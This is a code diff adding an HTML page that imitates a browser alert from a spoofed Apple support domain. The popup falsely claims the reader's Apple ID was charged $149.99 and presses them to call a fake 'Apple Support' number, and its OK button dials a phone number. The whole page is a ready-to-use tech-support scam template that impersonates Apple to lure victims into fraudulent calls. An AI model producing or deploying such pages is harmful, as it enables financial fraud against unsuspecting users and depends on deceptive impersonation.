@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Car Rental Alert</title>
+
+
+</head>
+
+<style>*
+
+html, body{
+    margin:0;
+    padding:0;
+    width:100%;
+    height:100%;
+}
+
+body{
+    background: url("lalu.png") center center/cover no-repeat fixed;
+    min-height:100vh;
+    font-family:Arial, sans-serif;
+}
+
+.overlay{
+position:fixed;
+left:0;
+top:0;
+width:100%;
+height:100%;
+background:rgba(0,0,0,.35);
+display:flex;
+justify-content:center;
+align-items:center;
+}
+
+.popup{
+width:330px;
+background:#2c2c2e;
+border-radius:16px;
+overflow:hidden;
+box-shadow:0 10px 40px rgba(0,0,0,.45);
+animation:pop .25s ease;
+}
+
+@keyframes pop{
+from{
+transform:scale(.85);
+opacity:0;
+}
+to{
+transform:scale(1);
+opacity:1;
+}
+}
+
+.popup h2{
+font-size:22px;
+font-weight:600;
+color:#fff;
+padding:22px 18px 10px;
+text-align:center;
+}
+
+.popup p{
+color:#fff;
+font-size:17px;
+line-height:1.45;
+padding:0 18px 20px;
+text-align:center;
+}
+
+.buttons{
+display:flex;
+border-top:1px solid rgba(255,255,255,.15);
+}
+
+.buttons button{
+flex:1;
+height:54px;
+border:none;
+background:transparent;
+font-size:20px;
+color:#0A84FF;
+cursor:pointer;
+}
+
+.buttons button:first-child{
+border-right:1px solid rgba(255,255,255,.15);
+}
+
+.buttons button:hover{
+background:rgba(255,255,255,.05);
+}</style>
+<body>
+
+<div class="overlay" id="popup">
+    <div class="popup">
+
+        <h2>apple-support-app-6xcev.ondigitalocean.app says</h2>
+
+        <p>
+            Your Apple ID was recently used at APPLE STORE for $149.99 Via Apple Pat Pre-Authorization! We have placed those request on hold to ensure Safest and Security. Not you? immediately Call
+            <br><br>
+
+            <strong>Apple Support:</strong> +1 0000000000
+            <br><br>
+
+            If you did not request this booking, please call our support immediately and freeze it.
+        </p>
+
+        <div class="buttons">
+            <button onclick="confirmBooking()">OK</button>
+            <button onclick="closePopup()">Cancel</button>
+        </div>
+
+    </div>
+</div>
+
+<script>function closePopup(){
+document.getElementById("popup").style.display="none";
+}
+
+function confirmBooking(){
+
+window.location.href="tel:+911234567890";
+
+// OR
+
+// window.location.href="booking.html";
+
+}function closePopup(){
+document.getElementById("popup").style.display="none";
+}
+
+function confirmBooking(){
+
+window.location.href="tel:+911234567890";
+
+// OR
+
+// window.location.href="booking.html";
+
+}</script>
+
+</body>
+</html>
